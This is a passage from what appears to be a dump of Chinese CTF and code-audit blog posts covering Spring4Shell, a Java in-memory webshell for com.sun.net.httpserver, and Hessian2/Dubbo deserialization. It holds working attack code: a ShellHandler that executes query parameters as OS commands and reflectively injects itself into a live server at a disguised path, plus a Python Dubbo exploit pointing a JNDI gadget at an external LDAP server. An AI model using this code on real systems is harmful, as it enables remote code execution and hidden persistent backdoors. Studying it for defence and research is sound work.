&#123; AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = (AbstractNestablePropertyAccessor.PropertyTokenHolder)pv.resolvedTokens; if (tokens == null) &#123;//null String propertyName = pv.getName(); AbstractNestablePropertyAccessor nestedPa; try &#123; nestedPa = this.getPropertyAccessorForPropertyPath(propertyName);//属性路径解析//解析如果错误(获取不到属性)就报错退出 &#125; catch (NotReadablePropertyException var6) &#123; throw new NotWritablePropertyException(this.getRootClass(), this.nestedPath + propertyName, &quot;Nested property in path &#39;&quot; + propertyName + &quot;&#39; does not exist&quot;, var6); &#125; tokens = this.getPropertyNameTokens(this.getFinalPath(nestedPa, propertyName)); if (nestedPa == this) &#123; pv.getOriginalPropertyValue().resolvedTokens = tokens; &#125; nestedPa.setPropertyValue(tokens, pv);// &#125; else &#123; this.setPropertyValue(tokens, pv); &#125; &#125; getPropertyAccessorForPropertyPath//属性路径递归解析获取属性 BeanWrapperImpl protected AbstractNestablePropertyAccessor getPropertyAccessorForPropertyPath(String propertyPath) &#123; int pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);//返回位置点号//中括号 if (pos &gt; -1) &#123; String nestedProperty = propertyPath.substring(0, pos); String nestedPath = propertyPath.substring(pos + 1); AbstractNestablePropertyAccessor nestedPa = this.getNestedPropertyAccessor(nestedProperty);//getNestedPropertyAccessor return nestedPa.getPropertyAccessorForPropertyPath(nestedPath);//递归 &#125; else &#123; return this; &#125; &#125; //getLocalPropertyHandler private AbstractNestablePropertyAccessor getNestedPropertyAccessor(String nestedProperty) &#123; if (this.nestedPropertyAccessors == null) &#123; this.nestedPropertyAccessors = new HashMap(); &#125; AbstractNestablePropertyAccessor.PropertyTokenHolder tokens = this.getPropertyNameTokens(nestedProperty); String canonicalName = tokens.canonicalName; Object value = this.getPropertyValue(tokens);...&#125; protected Object getPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens) throws BeansException &#123; String propertyName = tokens.canonicalName; String actualName = tokens.actualName; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(actualName);//getLocalPropertyHandler if (ph != null &amp;&amp; ph.isReadable()) &#123; try &#123; Object value = ph.getValue();//getValue //设置 ph.pd protected BeanWrapperImpl.BeanPropertyHandler getLocalPropertyHandler(String propertyName) &#123; PropertyDescriptor pd = this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName); return pd != null ? new BeanWrapperImpl.BeanPropertyHandler(pd) : null; &#125; public BeanPropertyHandler(PropertyDescriptor pd) &#123; super(pd.getPropertyType(), pd.getReadMethod() != null, pd.getWriteMethod() != null); this.pd = pd; &#125; setPropertyValue protected void setPropertyValue(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) throws BeansException &#123; if (tokens.keys != null) &#123;//null this.processKeyedProperty(tokens, pv); &#125; else &#123; this.processLocalProperty(tokens, pv);// &#125; &#125; private void processLocalProperty(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) &#123; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(tokens.actualName); if (ph != null &amp;&amp; ph.isWritable()) &#123; Object oldValue = null; PropertyChangeEvent propertyChangeEvent; try &#123;//id=1 Object originalValue = pv.getValue();//&quot;1&quot; Object valueToApply = originalValue;//&quot;1&quot; if (!Boolean.FALSE.equals(pv.conversionNecessary)) &#123;//pv.conversionNecessary=null if (pv.isConverted()) &#123;//pv.converted=false valueToApply = pv.getConvertedValue(); &#125; else &#123; if (this.isExtractOldValueForEditor() &amp;&amp; ph.isReadable()) &#123; try &#123;//this.extractOldValueForEditor=true//ph.readable=true oldValue = ph.getValue();//getValue &#125; &#125; valueToApply = this.convertForProperty(tokens.canonicalName, oldValue, originalValue, ph.toTypeDescriptor()); &#125; pv.getOriginalPropertyValue().conversionNecessary = valueToApply != originalValue; &#125; ph.setValue(valueToApply);//setValue BeanWrapperImpl$BeanPropertyHandler//ph//sink getValue public Object getValue() throws Exception &#123; Method readMethod = this.pd.getReadMethod();//getId() if (System.getSecurityManager() != null) &#123;//null ... &#125; else &#123; ReflectionUtils.makeAccessible(readMethod); return readMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), (Object[])null); &#125; &#125; public final Object getWrappedInstance() &#123; Assert.state(this.wrappedObject != null, &quot;No wrapped object&quot;); return this.wrappedObject;//前面target-&gt;wrappedObject &#125; setValue public void setValue(@Nullable Object value) throws Exception &#123; Method writeMethod = this.pd instanceof GenericTypeAwarePropertyDescriptor ? ((GenericTypeAwarePropertyDescriptor)this.pd).getWriteMethodForActualAccess() : this.pd.getWriteMethod();//setId() if (System.getSecurityManager() != null) &#123; ... &#125; else &#123; ReflectionUtils.makeAccessible(writeMethod); writeMethod.invoke(BeanWrapperImpl.this.getWrappedInstance(), value); &#125; 历史补丁//过滤classloadercurl http://localhost:8877/handling_form_submission_complete_war_exploded/greeting -d &quot;class.classLoader=1&quot; private void processLocalProperty(AbstractNestablePropertyAccessor.PropertyTokenHolder tokens, PropertyValue pv) &#123; AbstractNestablePropertyAccessor.PropertyHandler ph = this.getLocalPropertyHandler(tokens.actualName); if (ph != null &amp;&amp; ph.isWritable()) &#123;//ph=null ... &#125; else if (pv.isOptional()) &#123;//false ... &#125; else if (!this.suppressNotWritablePropertyException) &#123;//!false throw this.createNotWritablePropertyException(tokens.canonicalName);//报错 &#125; protected BeanWrapperImpl.BeanPropertyHandler getLocalPropertyHandler(String propertyName) &#123; PropertyDescriptor pd = this.getCachedIntrospectionResults().getPropertyDescriptor(propertyName);//getPropertyDescriptor返回null//map里没有classLoader属性 return pd != null ? new BeanWrapperImpl.BeanPropertyHandler(pd) : null; &#125; private CachedIntrospectionResults(Class&lt;?&gt; beanClass) throws BeansException &#123; try &#123; ... this.beanInfo = getBeanInfo(beanClass); ... this.propertyDescriptors = new LinkedHashMap(); Set&lt;String&gt; readMethodNames = new HashSet(); PropertyDescriptor[] pds = this.beanInfo.getPropertyDescriptors(); PropertyDescriptor[] var4 = pds; int var5 = pds.length; for(int var6 = 0; var6 &lt; var5; ++var6) &#123; PropertyDescriptor pd = var4[var6]; if (Class.class != beanClass || !&quot;classLoader&quot;.equals(pd.getName()) &amp;&amp; !&quot;protectionDomain&quot;.equals(pd.getName())) &#123;//过滤Class的classLoader和protectionDomain属性 if (logger.isTraceEnabled()) &#123; logger.trace(&quot;Found bean property &#39;&quot; + pd.getName() + &quot;&#39;&quot; + (pd.getPropertyType() != null ? &quot; of type [&quot; + pd.getPropertyType().getName() + &quot;]&quot; : &quot;&quot;) + (pd.getPropertyEditorClass() != null ? &quot;; editor [&quot; + pd.getPropertyEditorClass().getName() + &quot;]&quot; : &quot;&quot;)); &#125; pd = this.buildGenericTypeAwarePropertyDescriptor(beanClass, pd); this.propertyDescriptors.put(pd.getName(), pd); Method readMethod = pd.getReadMethod(); if (readMethod != null) &#123; readMethodNames.add(readMethod.getName()); &#125; &#125; &#125; &gt;=jdk9 module.classloader绕过https://xz.aliyun.com/t/11143 Class.getModule() 不是 Class.class 绕过classLoader判断 exphttps://github.com/lunasec-io/Spring4Shell-POC curl http://localhost:8877/handling_form_submission_complete_war_exploded/greeting -d &quot;class.classloader=1&quot; windows tomcat启动war包//用idea启动tomcat的情况，poc失败了，没写上文件（目录问题）","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"HttpHandler内存马","slug":"HttpHandler内存马","date":"2022-04-02T11:50:43.951Z","updated":"2022-04-02T11:52:34.200Z","comments":true,"path":"2022/04/02/HttpHandler内存马/","link":"","permalink":"https://pipimi110.github.io/2022/04/02/HttpHandler%E5%86%85%E5%AD%98%E9%A9%AC/","excerpt":"","text":"handlerDemopackage com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import templates.ShellHandler; import java.io.*; import java.lang.reflect.Field; import java.lang.reflect.Member; import java.net.InetSocketAddress; import java.util.Base64; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index1 &#123; public Index1() &#123; &#125; public static void main(String[] args) throws Exception &#123; System.out.println(&quot;server start&quot;); HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0); server.createContext(&quot;/&quot;, new Index1.MyHandler()); // server.createContext(&quot;/ShellHandler&quot;, new ShellHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); &#125; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); Map&lt;String, String&gt; queryMap = this.queryToMap(query); String response = &quot;Welcome to HFCTF 2022&quot;; if (queryMap != null) &#123; String token = (String) queryMap.get(&quot;token&quot;); String secret = &quot;HFCTF2022&quot;; if (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123; // if (true) &#123; InputStream is = t.getRequestBody(); try &#123; Hessian2Input input = new Hessian2Input(is); input.readObject(); &#125; catch (Exception var9) &#123; response = &quot;oops! something is wrong&quot;; &#125; &#125; else &#123; response = &quot;your token is wrong&quot;; &#125; &#125; t.sendResponseHeaders(200, (long) response.length()); OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); &#125; public Map&lt;String, String&gt; queryToMap(String query) &#123; if (query == null) &#123; return null; &#125; else &#123; Map&lt;String, String&gt; result = new HashMap(); String[] var3 = query.split(&quot;&amp;&quot;); int var4 = var3.length; for (int var5 = 0; var5 &lt; var4; ++var5) &#123; String param = var3[var5]; String[] entry = param.split(&quot;=&quot;); if (entry.length &gt; 1) &#123; result.put(entry[0], entry[1]); &#125; else &#123; result.put(entry[0], &quot;&quot;); &#125; &#125; return result; &#125; &#125; &#125; &#125; handler马package templates; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStream; public class ShellHandler implements HttpHandler &#123; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); String res = &quot;hello world&quot;; if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123; String[] flag = query.split(&quot;=&quot;); if (flag[0].equals(&quot;popko&quot;)) &#123; String line = null; BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;)); while ((line = reader.readLine()) != null) &#123; // System.out.println(line); res += line; &#125; &#125; &#125; t.sendResponseHeaders(200, res.length()); OutputStream os = t.getResponseBody(); os.write(res.getBytes()); os.close(); &#125; &#125; 替换handlerThread.currentThread().getThreadGroup() // System.out.println(new ShellHandler() instanceof ShellHandler); // System.out.println(ShellHandler.class.isInstance(new ShellHandler())); System.out.println(Class.forName(&quot;templates.ShellHandler&quot;).isInstance(new ShellHandler())); 寻找target不为空 this$0-&gt;contexts-&gt;list[0]-&gt;handler 替换所有handler getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;),&quot;list&quot;) //LinkedList遍历 int size = list.size(); for (int i=0; i&lt;size; i++) &#123; list.get(i); &#125; 加号转为空格 t.getRequestURI().getQuery().replace(“+”,” “); http://localhost:8090/?fuckkk=cat+/etc/passwd 添加handler public static void main(String[] args) throws Exception &#123; System.out.println(&quot;server start&quot;); HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0); server.createContext(&quot;/&quot;, new Index1.MyHandler());//断点 // server.createContext(&quot;/ShellHandler&quot;, new ShellHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); &#125; 获取server就可以添加handler了 exppackage marshalsec.templates; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStream; import java.lang.reflect.Field; import java.util.LinkedList; public class ShellHandler extends AbstractTranslet implements HttpHandler &#123; static &#123; System.out.println(&quot;[]start&quot;); try &#123; // replaceHandlers(); addHandler(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;[]end&quot;); &#125; public static Object getFV(Object var0, String var1) throws Exception &#123; Field var2 = null; Class var3 = var0.getClass(); while (var3 != Object.class) &#123; try &#123; var2 = var3.getDeclaredField(var1); break; &#125; catch (NoSuchFieldException var5) &#123; var3 = var3.getSuperclass(); &#125; &#125; if (var2 == null) &#123; throw new NoSuchFieldException(var1); &#125; else &#123; var2.setAccessible(true); return var2.get(var0); &#125; &#125; public static LinkedList getContextList() throws Exception &#123; try &#123; Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), &quot;threads&quot;); for (int var6 = 0; var6 &lt; var5.length; ++var6) &#123; Thread var7 = var5[var6]; if (var7 != null) &#123; Object var1 = getFV(var7, &quot;target&quot;); if (var1 != null) &#123; // Object var1 = getFV(var7, &quot;target&quot;); // if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(Thread.currentThread().getThreadGroup().threads[1].target)) &#123; if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(var1)) &#123; LinkedList var2 = (LinkedList) getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;), &quot;list&quot;); return var2; &#125; &#125; &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; public static void addHandler() throws Exception &#123; LinkedList var2 = getContextList(); if (var2 != null) &#123; Object var3 = getFV(var2.get(0), &quot;server&quot;); java.lang.reflect.Method method = var3.getClass().getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class); method.setAccessible(true); String mapper = &quot;/favicon11.jpg&quot;; method.invoke(var3, mapper, new ShellHandler()); &#125; &#125; public static void replaceHandlers() throws Exception &#123; LinkedList var2 = getContextList(); if (var2 != null) &#123; for (int i = 0; i &lt; var2.size(); i++) &#123; Object var3 = var2.get(i); Field field = var3.getClass().getDeclaredField(&quot;handler&quot;); field.setAccessible(true); field.set(var3, new ShellHandler()); &#125; &#125; &#125; public void handle(HttpExchange t) throws IOException &#123; String query = t.getRequestURI().getQuery(); String res = &quot;hello world&quot;; if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123; String[] flag = query.replace(&quot;+&quot;, &quot; &quot;).split(&quot;=&quot;); if (flag[0].equals(&quot;fuckkk&quot;)) &#123; String line = null; BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;)); while ((line = reader.readLine()) != null) &#123; // System.out.println(line); res += line; &#125; &#125; &#125; t.sendResponseHeaders(200, res.length()); OutputStream os = t.getResponseBody(); os.write(res.getBytes()); os.close(); &#125; @Override public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; &#125;","categories":[{"name":"后渗透","slug":"后渗透","permalink":"https://pipimi110.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"后渗透","slug":"后渗透","permalink":"https://pipimi110.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"Hessian2反序列化","slug":"Hessian2","date":"2022-04-01T10:39:39.999Z","updated":"2022-09-24T15:51:10.783Z","comments":true,"path":"2022/04/01/Hessian2/","link":"","permalink":"https://pipimi110.github.io/2022/04/01/Hessian2/","excerpt":"","text":"Hessian2https://www.cnblogs.com/bitterz/p/15526206.html 后反序列化利用 反序列化完成后，由于报错语句拼接，触发任意类toString方法 CVE-2020-1948(dubbo漏洞.md) 反序列化利用 能不能直接触发readObject反序列化呢? Hessian2ObjectInput重写的readObject只有类初始化和反射，没有原生readObject里的各种调用，也不像fastjson会触发setter,getter 但是hashmap会触发put方法，可以作为gadget的入口 demoimport org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput; import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput; import java.io.*; import java.util.HashMap; public class unser1 &#123; public static class MyHashMap&lt;K, V&gt; extends HashMap&lt;K, V&gt; &#123; public V put(K key, V value) &#123; super.put(key, value); System.out.println(111111111); try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (Exception e) &#123; &#125; System.out.println(22222222); return null; &#125; &#125; public static void main(String[] args) throws Exception&#123; // MyHashMap map = new MyHashMap(); // HashMap map = new HashMap(); // map.put(&quot;1&quot;, &quot;1&quot;);//共两次calc Person person = new Person(); person.setAge(20); person.setHobby(&quot;acg&quot;); person.setName(&quot;popko&quot;); person.setSex(&quot;male&quot;); // byte[] bytes = serialize(map); byte[] bytes = serialize(person); System.out.println(new String(bytes, 0, bytes.length)); Object o = unserialize(bytes); System.out.println(o); &#125; public static Object unserialize(byte[] bytes) throws Exception&#123; // hessian2的反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); Hessian2ObjectInput hessian2Input = new Hessian2ObjectInput(byteArrayInputStream); Object o = hessian2Input.readObject();//共两次calc return o; &#125; public static byte[] serialize(Object obj) throws Exception&#123; // hessian2的序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2ObjectOutput hessian2Output = new Hessian2ObjectOutput(byteArrayOutputStream); hessian2Output.writeObject(obj); hessian2Output.flushBuffer(); return byteArrayOutputStream.toByteArray(); &#125; &#125; 反序列化流程遍历出无参构造函数 反序列化时newInstance之前没有setAccess，反序列化类无参构造函数如果非public会报错 ensureMemberAccess:98, Reflection (sun.reflect) slowCheckMemberAccess:296, AccessibleObject (java.lang.reflect) checkAccess:288, AccessibleObject (java.lang.reflect) newInstance:413, Constructor (java.lang.reflect)//newInstance之前没有setAccess readMap:105, MapDeserializer (com.caucho.hessian.io) readMap:532, SerializerFactory (com.caucho.hessian.io) readObject:2117, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) hessianUnser:37, demo1 main:66, demo1 map = (Map)this._ctor.newInstance(); public MapDeserializer(Class&lt;?&gt; type) &#123; if (type == null) &#123; type = HashMap.class; &#125; this._type = type; Constructor&lt;?&gt;[] ctors = type.getConstructors(); for(int i = 0; i &lt; ctors.length; ++i) &#123; if (ctors[i].getParameterTypes().length == 0) &#123; this._ctor = ctors[i]; &#125;//遍历出无参构造函数 &#125; if (this._ctor == null) &#123; try &#123; this._ctor = HashMap.class.getConstructor(); &#125; catch (Exception var4) &#123; throw new IllegalStateException(var4); &#125; &#125; &#125; 构造函数初始化后，继续反序列化 map = (Map)this._ctor.newInstance(); &#125; catch (Exception var4) &#123; throw new IOExceptionWrapper(var4); &#125; &#125; in.addRef(map); while(!in.isEnd()) &#123; ((Map)map).put(in.readObject(), in.readObject());//继续hessianInput反序列化 &#125; readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:532, SerializerFactory (com.caucho.hessian.io) readObject:2117, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io)//继续hessianInput反序列化 readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) hessianUnser:39, demo1 main:68, demo1 原生hession使用了Unsafe可以使用初始化任意类 入口org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException &#123; return this.mH2i.readObject(cls); &#125; Hessian2Input也可以作为入口 instantiate:306, UnsafeDeserializer (com.caucho.hessian.io) readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:2110, Hessian2Input (com.caucho.hessian.io) main:38, exp2 Person(一般类)反序列化com\\alibaba\\com\\caucho\\hessian\\io\\Hessian2Input.class public Object readObject() throws IOException &#123; return this.readObject((List)null); &#125; public Object readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes) throws IOException &#123; ... case 67: this.readObjectDefinition((Class)null); return this.readObject(); private void readObjectDefinition(Class cl) throws IOException &#123; String type = this.readString(); int len = this.readInt(); String[] fieldNames = new String[len]; for(int i = 0; i &lt; len; ++i) &#123; fieldNames[i] = this.readString(); &#125; Hessian2Input.ObjectDefinition def = new Hessian2Input.ObjectDefinition(type, fieldNames); if (this._classDefs == null) &#123; this._classDefs = new ArrayList(); &#125; this._classDefs.add(def); &#125; 再次this.readObject()-&gt;this.readObject((List)null) private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); String[] fieldNames = def.getFieldNames(); if (cl != null) &#123; ... &#125; else &#123; return this.findSerializerFactory().readObject(this, type, fieldNames); &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\SerializerFactory.class public Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123; Deserializer deserializer = this.getDeserializer(type);//deserializer._type为Class Person if (deserializer != null) &#123; return deserializer.readObject(in, fieldNames);//跟进 public Deserializer getDeserializer(String type) throws HessianProtocolException &#123; if (type != null &amp;&amp; !type.equals(&quot;&quot;) &amp;&amp; !this._typeNotFoundDeserializerMap.containsKey(type)) &#123; ... Deserializer deserializer = (Deserializer)_staticTypeMap.get(type);//基本数据类型及其数组 ... try &#123; Class cl = this.loadSerializedClass(type); deserializer = this.getDeserializer(cl); public Class&lt;?&gt; loadSerializedClass(String className) throws ClassNotFoundException &#123; return this.getClassFactory().load(className);//appclassloader &#125; public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123;//黑名单 return Class.forName(className, false, this._loader);//Class.forName类加载//false,没有初始化 &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class;//不存在或在黑名单里则返回HashMap &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\JavaDeserializer.class public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123; try &#123; Object obj = this.instantiate();//类初始化 return this.readObject(in, obj, fieldNames); public Object readObject(AbstractHessianInput in, Object obj, String[] fieldNames) throws IOException &#123; try &#123; int ref = in.addRef(obj); for(int i = 0; i &lt; fieldNames.length; ++i) &#123; String name = fieldNames[i]; JavaDeserializer.FieldDeserializer deser = (JavaDeserializer.FieldDeserializer)this._fieldMap.get(name);//获取属性 if (deser != null) &#123; deser.deserialize(in, obj);//跟进 &#125; else &#123; in.readObject(); &#125; &#125; void deserialize(AbstractHessianInput in, Object obj) throws IOException &#123; String value = null; try &#123; value = in.readString(); this._field.set(obj, value);//反射设置属性 &#125; catch (Exception var5) &#123; JavaDeserializer.logDeserializeError(this._field, obj, value, var5); &#125; &#125; protected Object instantiate() throws Exception &#123; try &#123; return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance();//this._type.newInstance() 类初始化 hashmap反序列化 protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123; Deserializer keyDeserializer = null; Deserializer valueDeserializer = null; SerializerFactory factory = this.findSerializerFactory(in); if (keyType != null) &#123; keyDeserializer = factory.getDeserializer(keyType.getName()); &#125; if (valueType != null) &#123; valueDeserializer = factory.getDeserializer(valueType.getName()); &#125; while(!in.isEnd()) &#123; map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); &#125; &#125; exp需要可用性，wireshark抓包太麻烦了，， python# pip3 install dubbo-py import socket import binascii import re import time from dubbo.codec.hessian2 import Decoder, new_object from dubbo.client import DubboClient def exp1(ip,port): client = DubboClient(ip,port) JdbcRowSetImpl = new_object( &#39;com.sun.rowset.JdbcRowSetImpl&#39;, dataSource=&quot;ldap://150.158.172.182:1389/o=reference&quot;, strMatchColumns=[&quot;foo&quot;] ) JdbcRowSetImplClass = new_object( &#39;java.lang.Class&#39;, name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;, ) toStringBean = new_object( &#39;com.rometools.rome.feed.impl.ToStringBean&#39;, beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) # print(toStringBean) # exit() resp = client.send_request_and_return_response( service_name=&#39;cn.rui0&#39;, method_name=&#39;any&#39;,#&lt;=2.7.5 # service_name=&#39;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#39;, # method_name=&#39;rceTest&#39;, # service_version=&#39;1.0.0&#39;, args=[toStringBean]) print(resp) res = str(resp) notfound = &quot;ClassNotFoundException: com.rometools.rome.feed.impl.ToStringBean&quot; fix = &quot;arguments=[]&quot; if notfound in res: print(&quot;notfound depend&quot;) elif fix in res: print(&quot;already fix&quot;) else: print(&quot;success&quot;) ip=&#39;127.0.0.1&#39; port = 20880 exp1(ip,port) javahttps://github.com/lz2y/DubboPOC 参考并进行修改，，， dubbo和hession的不同类初始化不同原生hession使用了Unsafe可以使用初始化任意类 dubbo通过构造函数初始化，参数默认null，部分构造函数使用到参数可能会报错退出//如SignedObject 原生readObject和构造函数无关，可以用来绕过一下黑名单 dubbo hession case 111: ref = tag - 96; if (this._classDefs == null) &#123; throw this.error(&quot;No classes defined at reference &#39;&#123;0&#125;&#39;&quot; + tag); &#125; def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref); return this.readObjectInstance((Class)null, def); private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); String[] fieldNames = def.getFieldNames(); if (cl != null) &#123;//cl=null Deserializer reader = this.findSerializerFactory().getObjectDeserializer(type, cl); return reader.readObject(this, fieldNames); &#125; else &#123; return this.findSerializerFactory().readObject(this, type, fieldNames);//dubbo默认使用this.findSerializerFactory() &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\SerializerFactory.class public Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123; Deserializer deserializer = this.getDeserializer(type); if (deserializer != null) &#123; return deserializer.readObject(in, fieldNames); &#125; ... com\\alibaba\\com\\caucho\\hessian\\io\\JavaDeserializer.class public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123; try &#123; Object obj = this.instantiate(); protected Object instantiate() throws Exception &#123; try &#123; return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance(); &#125; catch (Exception var2) &#123; throw new HessianProtocolException(&quot;&#39;&quot; + this._type.getName() + &quot;&#39; could not be instantiated&quot;, var2); &#125;//SignedObject构造函数参数为new Object[3],即三个null时，this.sign(signingKey, signingEngine);报错退出 &#125; 原生hession case 111: ref = tag - 96; if (this._classDefs.size() &lt;= ref) &#123; throw this.error(&quot;No classes defined at reference &#39;&quot; + Integer.toHexString(tag) + &quot;&#39;&quot;); &#125; def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref); return this.readObjectInstance((Class)null, def); private Object readObjectInstance(Class&lt;?&gt; cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); Deserializer reader = def.getReader(); Object[] fields = def.getFields(); SerializerFactory factory = this.findSerializerFactory(); if (cl != reader.getType() &amp;&amp; cl != null) &#123;//cl=null reader = factory.getObjectDeserializer(type, cl); return reader.readObject(this, def.getFieldNames()); &#125; else &#123; return reader.readObject(this, fields);//hession使用reader &#125; &#125; com\\caucho\\hessian\\io\\UnsafeDeserializer.class private static Unsafe _unsafe; static &#123; boolean isEnabled = false; try &#123; Class&lt;?&gt; unsafe = Class.forName(&quot;sun.misc.Unsafe&quot;); Field theUnsafe = null; Field[] arr$ = unsafe.getDeclaredFields(); int len$ = arr$.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; Field field = arr$[i$]; if (field.getName().equals(&quot;theUnsafe&quot;)) &#123; theUnsafe = field; &#125; &#125; if (theUnsafe != null) &#123; theUnsafe.setAccessible(true); _unsafe = (Unsafe)theUnsafe.get((Object)null); &#125; isEnabled = _unsafe != null; String unsafeProp = System.getProperty(&quot;com.caucho.hessian.unsafe&quot;); if (&quot;false&quot;.equals(unsafeProp)) &#123; isEnabled = false; &#125; &#125; catch (Throwable var7) &#123; log.log(Level.FINER, var7.toString(), var7); &#125; _isEnabled = isEnabled; &#125; public Object readObject(AbstractHessianInput in, Object[] fields) throws IOException &#123; try &#123; Object obj = this.instantiate(); protected Object instantiate() throws Exception &#123; return _unsafe.allocateInstance(this._type);//只会为我们的类分配内存，不会调用构造函数 &#125; 